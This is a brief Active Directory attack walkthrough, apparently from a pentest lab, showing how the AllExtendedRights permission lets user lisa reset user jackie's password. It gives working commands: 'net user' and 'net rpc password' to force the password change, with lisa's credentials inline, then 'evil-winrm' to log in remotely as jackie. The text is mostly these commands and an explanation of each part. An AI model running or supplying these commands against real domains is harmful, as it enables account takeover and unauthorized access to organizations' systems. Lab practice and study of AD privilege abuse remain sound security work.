# AllExtendedRights
![alt text](image.png)
- The AllExtendedRights permission grants LISA@SUB.POSEIDON.YZX the ability to change the password of the user JACKIE@SUB.POSEIDON.YZX without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.
## Bloodhound Recommendation
```bash
net user dfm.a Password123! /domain
```
## Change the User JACKIE password
```bash
net rpc password jackie 'Password123!' -U 'sub.poseidon.yzx/lisa%LisaWayToGo456' -S 192.168.107.162

#Command Explained
net rpc — using Samba's net tool to make RPC calls
password — the action, changing a password
jackie — the target user whose password we're changing
'Password123!' — the new password we're setting
-U — the user we're authenticating AS (lisa, who has AllExtendedRights over jackie)
sub.poseidon.yzx/lisa — domain\username format
%LisaWayToGo456 — the % separates username from password inline
```

## Login with new password
```bsah
evil-winrm -i 192.168.107.162 -u 'jackie' -p 'Password123!'